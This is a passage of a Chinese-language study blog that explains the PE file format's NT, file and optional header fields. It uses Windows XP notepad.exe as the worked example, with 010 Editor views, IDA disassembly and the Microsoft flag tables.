<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\PE&gt; g++ main.cpp <span class="literal">-O0</span> <span class="literal">-o</span> main</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\PE&gt; ./main</span><br><span class="line"><span class="number">536</span>e6144   DanS</span><br><span class="line"><span class="number">0</span>   </span><br><span class="line"><span class="number">0</span>   </span><br><span class="line"><span class="number">0</span>   </span><br><span class="line"><span class="number">4023</span>fa   ?</span><br></pre></td></tr></table></figure>
<p>结果给了一个"DanS"字符串还有一堆乱码</p>
<p>我猜DanS是一个开发者姓名的前缀.但是上网搜不到...</p>
<p>尤其是搜NotePad作者的时候总是铺天盖地的降智辱华话题,凡是能在这种话题上引起讨论的都是大聪明</p>
<h3 id="nt头">NT头</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span><span class="comment">//64位程序的NT头</span></span><br><span class="line">  DWORD Signature;</span><br><span class="line">  IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64,*PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span><span class="comment">//32位程序的NT头</span></span><br><span class="line">  DWORD Signature;</span><br><span class="line">  IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>
<p>对于notepad.exe</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711122440212.png"
alt="image-20220711122440212" />
<figcaption aria-hidden="true">image-20220711122440212</figcaption>
</figure>
<p>其NT头从E8h开始,长度为F8h</p>
<p>包括三个成员,一个双字类型的签名魔数4550h,表明NT头开始了</p>
<p>两个结构体成员,一个文件头,一个可选头</p>
<h4 id="nt文件头">Nt文件头</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  WORD Machine;</span><br><span class="line">  WORD NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD SizeOfOptionalHeader;</span><br><span class="line">  WORD Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>
<p>notepad.exe的文件头</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711122847055.png"
alt="image-20220711122847055" />
<figcaption aria-hidden="true">image-20220711122847055</figcaption>
</figure>
<h5 id="machine">Machine</h5>
<p>Machine是机器码,表征该程序可以在哪种计算机体系上运行</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711123000530.png"
alt="image-20220711123000530" />
<figcaption aria-hidden="true">image-20220711123000530</figcaption>
</figure>
<p>显然winXP上的notepad.exe的Machine值是14Ch,对应x86体系</p>
<h5 id="numberofsections">NumberOfSections</h5>
<p>节区数量,该值和节区头表中存在的节区数量一定相等</p>
<p>NotePad.exe中该值为3,其后面的节区数量也确实为3</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711123225586.png"
alt="image-20220711123225586" />
<figcaption aria-hidden="true">image-20220711123225586</figcaption>
</figure>
<p>该值决定了节区头表的大小(每个节都在节区头表中有相同大小的一项)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711123352685.png"
alt="image-20220711123352685" />
<figcaption aria-hidden="true">image-20220711123352685</figcaption>
</figure>
<p>可以看出节区头表中的项目都是28h字节大小的</p>
<h5 id="timedatestamp">TimeDateStamp</h5>
<p>链接器生成该文件的时间,该值是从1970年1月1日0时(UTC时间)开始的秒数</p>
<p>notepad.exe中该值为</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711123559456.png"
alt="image-20220711123559456" />
<figcaption aria-hidden="true">image-20220711123559456</figcaption>
</figure>
<p>010editor已经帮我们换算好了时间,是<code>2001.8.17 20:52:29</code></p>
<h5 id="pointertosymboltable">PointerToSymbolTable</h5>
<p>符号表symbol table的偏移量,如果没有符号表则该值为0</p>
<p>notepad.exe中没有符号表,该值为0</p>
<blockquote>
<p>为啥可以没有符号表呢?</p>
<p>符号是给人看的,比如每个函数,每个变量都有一个名字.这是为了方便人记忆与理解</p>
<p>但是机器不需要,要执行哪个函数只会在汇编语言中写上call
地址,只认地址不认名</p>
<p>可能编译链接阶段需要符号解析,用到符号表,但是一旦编译链接完成,生成了可执行目标文件,符号表就纯纯的没用了</p>
</blockquote>
<h5 id="numberofsymbols">NumberOfSymbols</h5>
<p>记录符号表中的符号数量</p>
<p>notepad.exe没有符号表,该项也为0</p>
<h5 id="sizeofoptionalheader">SizeOfOptionalHeader</h5>
<p>可选头的大小</p>
<p>在notepad.exe中该值为224D=E0h</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711131155606.png"
alt="image-20220711131155606" />
<figcaption aria-hidden="true">image-20220711131155606</figcaption>
</figure>
<p>紧跟在文件头后面的可选头恰好就这么大</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711131247686.png"
alt="image-20220711131247686" />
<figcaption aria-hidden="true">image-20220711131247686</figcaption>
</figure>
<blockquote>
<p>DOS头记录了NT头的偏移量,类比一下,为啥没有记录可选头的起始位置呢?</p>
<p>因为文件头的大小是固定的14h,Characterstics是一些二进制位按位或,其总长度就是一个WORD不变</p>
<p>因此可选头紧接着文件头,只要文件头的偏移量知道了,立刻可以算出</p>
<p>可选头的偏移量=文件头+14h字节</p>
<p>而文件头的偏移量是多少?文件头是Nt头的第二个成员,第一个成员是一个双字类型的NT签名,</p>
<p>因此文件头的偏移量=Nt头的偏移量+4字节</p>
<p>Nt头的偏移量是多少?DOS头的<code>DWORD AddressOfNewExeHeader</code>会直接给出</p>
<p>AddressOfNewExeHeader在哪里?DOS头是PE文件的开始,AddressOfNewExeHeader是其3C偏移处,即AddressOfNewHeader永远是PE文件的3Ch到40h字节</p>
</blockquote>
<h5 id="characteristics">Characteristics</h5>
<p>本文件属性,多个属性时按位或</p>
<p>比如0x0002就表示可执行映像,意味本文件可以执行(没有未解析的外部引用),</p>
<p>显然括号里是说给可重定位目标模块听的,因为.obj只是完成了编译,尚未经过链接,外部符号仍未解析</p>
<p>又如0x2000就表示DLL动态库文件,虽然它是可执行文件,但是它不能直接运行.</p>
<p>又如0x4000表示本文件只能在单处理机计算机上运行</p>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_RELOCS_STRIPPED</strong>0x0001</td>
<td style="text-align: left;">Relocation information was stripped from
the file. The file must be loaded at its preferred base address. If the
base address is not available, the loader reports an error.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_EXECUTABLE_IMAGE</strong>0x0002</td>
<td style="text-align: left;">The file is executable (there are no
unresolved external references).</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_LINE_NUMS_STRIPPED</strong>0x0004</td>
<td style="text-align: left;">COFF line numbers were stripped from the
file.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_LOCAL_SYMS_STRIPPED</strong>0x0008</td>
<td style="text-align: left;">COFF symbol table entries were stripped
from file.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_AGGRESIVE_WS_TRIM</strong>0x0010</td>
<td style="text-align: left;">Aggressively trim the working set. This
value is obsolete.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_LARGE_ADDRESS_AWARE</strong>0x0020</td>
<td style="text-align: left;">The application can handle addresses
larger than 2 GB.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_BYTES_REVERSED_LO</strong>0x0080</td>
<td style="text-align: left;">The bytes of the word are reversed. This
flag is obsolete.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_32BIT_MACHINE</strong>0x0100</td>
<td style="text-align: left;">The computer supports 32-bit words.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_DEBUG_STRIPPED</strong>0x0200</td>
<td style="text-align: left;">Debugging information was removed and
stored separately in another file.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP</strong>0x0400</td>
<td style="text-align: left;">If the image is on removable media, copy
it to and run it from the swap file.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_NET_RUN_FROM_SWAP</strong>0x0800</td>
<td style="text-align: left;">If the image is on the network, copy it to
and run it from the swap file.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_SYSTEM</strong>0x1000</td>
<td style="text-align: left;">The image is a system file.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>IMAGE_FILE_DLL</strong>0x2000</td>
<td style="text-align: left;">The image is a DLL file. While it is an
executable file, it cannot be run directly.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_UP_SYSTEM_ONLY</strong>0x4000</td>
<td style="text-align: left;">The file should be run only on a
uniprocessor computer.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_FILE_BYTES_REVERSED_HI</strong>0x8000</td>
<td style="text-align: left;">The bytes of the word are reversed. This
flag is obsolete.</td>
</tr>
</tbody>
</table>
<p>notepad.exe中该值为010Fh(小端序)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711125018251.png"
alt="image-20220711125018251" />
<figcaption aria-hidden="true">image-20220711125018251</figcaption>
</figure>
<p><code>010F=0100 | 0001 | 0002 | 0004 | 0008</code>,即集合了5个属性</p>
<p>包括:</p>
<p>0001:重定位信息被删,本程序必须加载到其可选头中规定的ImageBase处,否则报错</p>
<p>0002:可执行</p>
<p>0004:COFF行号被删</p>
<blockquote>
<p>COFF:common object file
format.通用对象文件格式,这是Unix的目标文件格式,windows最初的目标文件就是抄的COFF</p>
</blockquote>
<blockquote>
<p>编译时加入-g选项就会生成,<code>gcc -g</code>,该选项的作用是生成调试信息,因此COFF行号的作用之一就是调试,之二是啥我目前不知道</p>
</blockquote>
<p>0008:COFF符号表被删</p>
<blockquote>
<p>符号表是从可重定位目标文件连接到可执行目标文件进行符号解析时需要的.</p>
<p>.o和.obj这种可重定位目标模块必须要有符号表</p>
<p>.exe和.out这种可执行目标模块不需要有</p>
<p>显然notepad.exe已经编译链接好了,不需要符号表了</p>
</blockquote>
<p>0100:计算机支持32位的字,意思是CPU可以一次性处理32位宽的数据.</p>
<blockquote>
<p>显然x86_32上的大部分寄存器(比如eax,esp)等都是32位宽的,总线宽度也是32位,CPU完全有能力一次性处理32位宽的数据</p>
</blockquote>
<h4 id="可选头">可选头</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  WORD Magic;</span><br><span class="line">  BYTE MajorLinkerVersion;</span><br><span class="line">  BYTE MinorLinkerVersion;</span><br><span class="line">  DWORD SizeOfCode;</span><br><span class="line">  DWORD SizeOfInitializedData;</span><br><span class="line">  DWORD SizeOfUninitializedData;</span><br><span class="line">  DWORD AddressOfEntryPoint;</span><br><span class="line">  DWORD BaseOfCode;</span><br><span class="line">  DWORD BaseOfData;</span><br><span class="line">  DWORD ImageBase;</span><br><span class="line">  DWORD SectionAlignment;</span><br><span class="line">  DWORD FileAlignment;</span><br><span class="line">  WORD MajorOperatingSystemVersion;</span><br><span class="line">  WORD MinorOperatingSystemVersion;</span><br><span class="line">  WORD MajorImageVersion;</span><br><span class="line">  WORD MinorImageVersion;</span><br><span class="line">  WORD MajorSubsystemVersion;</span><br><span class="line">  WORD MinorSubsystemVersion;</span><br><span class="line">  DWORD Win32VersionValue;</span><br><span class="line">  DWORD SizeOfImage;</span><br><span class="line">  DWORD SizeOfHeaders;</span><br><span class="line">  DWORD CheckSum;</span><br><span class="line">  WORD Subsystem;</span><br><span class="line">  WORD DllCharacteristics;</span><br><span class="line">  DWORD SizeOfStackReserve;</span><br><span class="line">  DWORD SizeOfStackCommit;</span><br><span class="line">  DWORD SizeOfHeapReserve;</span><br><span class="line">  DWORD SizeOfHeapCommit;</span><br><span class="line">  DWORD LoaderFlags;</span><br><span class="line">  DWORD NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>
<h5 id="magic">Magic</h5>
<p>区分本文件是32位还是64位又或者是ROM映像的魔数</p>
<p>magic=0x10B表示32位</p>
<p>magic=0x20B表示64位</p>
<p>magic=0x107表示ROM映像</p>
<blockquote>
<p>前两个好理解,这第三个ROM映像是啥呢?</p>
<p>表明本程序是烧录到一个ROM存储器中的<strong>固件</strong></p>
<p>比如BIOS中的程序,CD-ROM中的程序等等</p>
</blockquote>
<p>winXP上的notepad.exe自然是32位的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711132424181.png"
alt="image-20220711132424181" />
<figcaption aria-hidden="true">image-20220711132424181</figcaption>
</figure>
<p>010editor也帮我们把枚举类型10Bh翻译成了PE32</p>
<h5 id="majorminorlinkerversion">Major/MinorLinkerVersion</h5>
<p>主/次链接器版本</p>
<p>对于notepad.exe这种已经编译链接完成的程序来说,自然这两个值白给</p>
<p>这两个值是相对于可重定位目标模块.o,.obj或者库文件.so,.dll这种需要参与链接的目标文件而言的</p>
<p>notepad.exe的这两个值分别是7和0</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711132938159.png"
alt="image-20220711132938159" />
<figcaption aria-hidden="true">image-20220711132938159</figcaption>
</figure>
<blockquote>
<p>这个版本号应该是MSVC的版本,不是GCC的ld链接器的版本</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/v2-eb05f1dde948bdceb87f74864f6fe85d_1440w.jpg"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>根据notepad.exe的开发时间2001年,差不多就是MSVC++ 7.0的时间</p>
<p>而GCC ld到现在才是版本2</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711133034580.png"
alt="image-20220711133034580" />
<figcaption aria-hidden="true">image-20220711133034580</figcaption>
</figure>
<p>就算是gcc本身的版本在2001年左右也才是3,目前在linux上是11,windows上是9</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711133237229.png"
alt="image-20220711133237229" />
<figcaption aria-hidden="true">image-20220711133237229</figcaption>
</figure>
<p>胡乱写了一个main.c用gcc编译链接成main.exe然后用010editor打开观察,</p>
<p>发现主链接器版本确实就是ld的当前版本2</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134050894.png"
alt="image-20220711134050894" />
<figcaption aria-hidden="true">image-20220711134050894</figcaption>
</figure>
<p>但是次链接器版本就是乱码了,看来这个值不重要</p>
</blockquote>
<h5 id="sizeofcode">SizeOfCode</h5>
<p>code节的大小,然而我从来没有见过叫.code的节,code不就是代码吗,不就是指令吗,不就是.text节咩?</p>
<p>在notepad.exe上SizeOfCode是6E00h</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134530037.png"
alt="image-20220711134530037" />
<figcaption aria-hidden="true">image-20220711134530037</figcaption>
</figure>
<p>后面.text节区恰好就是6E00h这么大</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134550293.png"
alt="image-20220711134550293" />
<figcaption aria-hidden="true">image-20220711134550293</figcaption>
</figure>
<h5 id="sizeofinitializeddata">SizeOfInitializedData</h5>
<p>已初始化的数据节</p>
<p>notepad.exe中SizeOfInitializedData=36864D=9000H</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134856362.png"
alt="image-20220711134856362" />
<figcaption aria-hidden="true">image-20220711134856362</figcaption>
</figure>
<p>.data和.rsrc节合起来才刚好是9000h这么大,看来不光是.data节,还得算上类似性质的节</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711134923197.png"
alt="image-20220711134923197" />
<figcaption aria-hidden="true">image-20220711134923197</figcaption>
</figure>
<blockquote>
<p>.data节是已初始化的全局变量和静态变量,这容易理解,那么.rsrc是个什么节呢?</p>
<p>查阅<a
target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/debug/pe-format#the-rsrc-section">PE
格式 - Win32 apps | Microsoft Docs</a></p>
<p>rsrc节用来存放资源</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711135628794.png"
alt="image-20220711135628794" />
<figcaption aria-hidden="true">image-20220711135628794</figcaption>
</figure>
<p>这里"资源"包括图标等,看介绍是以树形结构组织的,类似于HTML?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711135744137.png"
alt="image-20220711135744137" />
<figcaption aria-hidden="true">image-20220711135744137</figcaption>
</figure>
</blockquote>
<h5 id="sizeofuninitializeddata">SizeOfUninitializedData</h5>
<p>未初始化的数据节,应该是指.bss节,然而notepad.exe上该值为0,自然也就没有.bss节</p>
<p>(应该说节区头表中就没有.bss节的记录,真正的节区中永远都没有.bss节,因为它只会在执行时才会形成</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711135949436.png"
alt="image-20220711135949436" />
<figcaption aria-hidden="true">image-20220711135949436</figcaption>
</figure>
<h5 id="addressofentrypoint">AddressOfEntryPoint</h5>
<p>入口点函数指针,具体指向谁呢?看看notepad.exe是啥样的</p>
<p>AddressOfEntryPoint=6AE0</p>
<blockquote>
<p>这个值是个相对进程映像基地址ImageBase 的偏移量,或者叫RVA</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711141108874.png"
alt="image-20220711141108874" />
<figcaption aria-hidden="true">image-20220711141108874</figcaption>
</figure>
<p>010editor给了提示,.text节中偏移量为0x5EE0的地方,为啥从6AE0变成5EE0了?</p>
<p>先用010editor看看0x5EE0这个地方发生了啥</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711141602298.png"
alt="image-20220711141602298" />
<figcaption aria-hidden="true">image-20220711141602298</figcaption>
</figure>
<p>两个压栈,好像是函数开端的样子,然而两个地址分别是啥,这个问题还没有解决.</p>
<p>用ida打开notepad.exe观察<code>0x1006AE0</code>这个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:01006AE0 ; __unwind &#123; // __SEH_prolog</span><br><span class="line">.text:01006AE0                 push    70h</span><br><span class="line">.text:01006AE2                 push    offset stru_1001888 ; struct _exception *</span><br><span class="line">.text:01006AE7                 call    __SEH_prolog</span><br><span class="line">.text:01006AEC                 xor     ebx, ebx</span><br></pre></td></tr></table></figure>
<p>发现这里的指令和在010editor中观察0x5EE0是一模一样的.</p>
<p>到底发生甚么事了?</p>
<blockquote>
<p>为啥是0x1006AE0不是0x6AE0?为啥不观察0x5EE0或者0x1005EE0?</p>
<p>ida打开的文件实际上是文件加载到内存之后的映像,不然任务管理器上看IDA为啥会一枝独秀地使用133.3M这么大的内存空间?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711142150809.png"
alt="image-20220711142150809" />
<figcaption aria-hidden="true">image-20220711142150809</figcaption>
</figure>
<p>而010editor打开的是磁盘文件系统中躺着的静态文件</p>
<p>前面权位指南也讲过,两者是有很大差别的</p>
<p>文件系统中的静态文件都是从0开始计算偏移量RAW</p>
<p>进程映像则从一个指定的基地址开始计算实际虚拟地址空间中的地址,VA=RVA+ImageBase</p>
<p>而notepad.exe的ImageBase就在可选头中规定为1000000h</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711142522560.png"
alt="image-20220711142522560" />
<figcaption aria-hidden="true">image-20220711142522560</figcaption>
</figure>
<p>因此notepad.exe的进程映像就是从1000000h开始的,这就解释了为啥要用ida观察0x1006AE0,而不是0x6AE0</p>
<p>至于另一个问题,这是因为,节区在磁盘文件中存放和加载到内存映像中时,有不同的对齐要求</p>
<p>往往内存中的对齐要求更大,因此对于PE头和text节之间的空隙,进程映像中的更大,</p>
<p>因此text节的RAW(文件偏移
)和RVA(虚拟地址偏移)是不同的,并且有RVA&gt;RAW</p>
<p>更详细的原因需要学习后面的RAW to
RVA,将进程从文件装载进入内存的知识</p>
</blockquote>
<h5 id="baseofcode">BaseOfCode</h5>
<p>代码段在虚拟地址空间中的开始地址</p>
<p>notepad.exe这种BaseOfCode=1000h,即虚拟内存中的相对偏移量RVA=1000h,那么实际虚拟地址为VA=Image+RVA=1000000h+1000h=1001000h</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711165812127.png"
alt="image-20220711165812127" />
<figcaption aria-hidden="true">image-20220711165812127</figcaption>
</figure>
<p>使用ida观察这个<code>1001000h</code>地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.idata:01001000 ; Section 1. (virtual address 00001000)</span><br><span class="line">.idata:01001000 ; Virtual size                  : 00006D72 (  28018.)</span><br><span class="line">.idata:01001000 ; Section size in file          : 00006E00 (  28160.)</span><br><span class="line">.idata:01001000 ; Offset to raw data for section: 00000400</span><br><span class="line">.idata:01001000 ; Flags 60000020: Text Executable Readable</span><br><span class="line">.idata:01001000 ; Alignment     : default</span><br><span class="line">.idata:01001000 ;</span><br><span class="line">.idata:01001000 ; Imports from ADVAPI32.dll</span><br><span class="line">.idata:01001000 ;</span><br><span class="line">.idata:01001000 ; PDB File Name : notepad.pdb</span><br><span class="line">.idata:01001000</span><br><span class="line">.idata:01001000                 .686p</span><br><span class="line">.idata:01001000                 .mmx</span><br><span class="line">.idata:01001000                 .model flat</span><br><span class="line">.idata:01001000</span><br><span class="line">.idata:01001000 ; ===========================================================================</span><br><span class="line">.idata:01001000</span><br><span class="line">.idata:01001000 ; Segment type: Externs</span><br><span class="line">.idata:01001000 ; _idata</span><br><span class="line">.idata:01001000 ; LSTATUS __stdcall RegQueryValueExW(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)</span><br><span class="line">.idata:01001000                 extrn RegQueryValueExW:dword</span><br><span class="line">.idata:01001000                                         ; CODE XREF: RegGetInt(x,x,x)+32↓p</span><br><span class="line">.idata:01001000                                         ; RegGetString(x,x,x,x,x)+27↓p</span><br><span class="line">.idata:01001000                                         ; DATA XREF: ...</span><br><span class="line">.idata:01001004 ; LSTATUS __stdcall RegCloseKey(HKEY hKey)</span><br><span class="line">.idata:01001004                 extrn RegCloseKey:dword ; CODE XREF: SaveGlobals()+24A↓p</span><br><span class="line">.idata:01001004                                         ; GetGlobals()+29B↓p ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>发现是.idata节的开始</p>
<blockquote>
<p>ida在该节一开始给出了一块注释:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.idata:01001000 ; Section 1. (virtual address 00001000)</span><br><span class="line">.idata:01001000 ; Virtual size                  : 00006D72 (  28018.)</span><br><span class="line">.idata:01001000 ; Section size in file          : 00006E00 (  28160.)</span><br><span class="line">.idata:01001000 ; Offset to raw data for section: 00000400</span><br><span class="line">.idata:01001000 ; Flags 60000020: Text Executable Readable</span><br><span class="line">.idata:01001000 ; Alignment     : default</span><br></pre></td></tr></table></figure>
<p>第一节(相对虚拟地址1000h)</p>
<p>虚拟内存中的大小6D72h</p>
<p>磁盘文件中的大小6E00h</p>
<p>磁盘文件中的基地址400h</p>
<p>标志:60000020,意思是可执行可读 不可写</p>
<p>对齐:默认</p>
<p>这些都和010editor给出的结果相吻合</p>
</blockquote>
<p>问题是,<code>idata</code>名字里都带有<code>data</code>了,不应该算是数据吗?怎么就是代码了?</p>
<p>但是观察ida反汇编的结果,这里都是<code>extern</code>声明的函数接口,确实不是数据,但你说它是代码吧,它还没有实现</p>
<blockquote>
<p>微软对于该节给出的解释是:</p>
<p>These tables were added to the image to support a uniform mechanism
for applications to delay the loading of a DLL until the first call into
that DLL. The layout of the tables matches that of the traditional
import tables that are described in section 6.4, <a
target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-idata-section">The
.idata Section</a>." Only a few details are discussed here.</p>
<p>作用是允许DLL库函数在首次被调用是加载</p>
</blockquote>
<blockquote>
<p>win32exe程序中的idata节非常像linux可执行目标文件中的extern节,</p>
<p>也确实,因为ida给idata节一开始的注释就是<code>Segment Type:extern</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711170645587.png"
alt="image-20220711170645587" />
<figcaption aria-hidden="true">image-20220711170645587</figcaption>
</figure>
<p>Linux上从<code>.text</code>到<code>extern</code>的调用顺序为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">首先是.text:000011C2                 call    _printf</span><br><span class="line">	</span><br><span class="line">然后是</span><br><span class="line">.plt:00001030 ; int printf(const char *format, ...)</span><br><span class="line">.plt:00001030 _printf         proc near               ; CODE XREF: main+25↓p</span><br><span class="line">.plt:00001030</span><br><span class="line">.plt:00001030 format          = dword ptr  4</span><br><span class="line">.plt:00001030</span><br><span class="line">.plt:00001030                 jmp     ds:off_400C     ; PIC mode</span><br><span class="line">.plt:00001030 _printf         endp</span><br><span class="line">.plt:00001030	</span><br><span class="line"></span><br><span class="line">然后是</span><br><span class="line">.got.plt:0000400C off_400C        dd offset printf        ; DATA XREF: _printf↑r</span><br><span class="line"></span><br><span class="line">然后是</span><br><span class="line">extern:0000402C ; int printf(const char *format, ...)</span><br><span class="line">extern:0000402C                 extrn 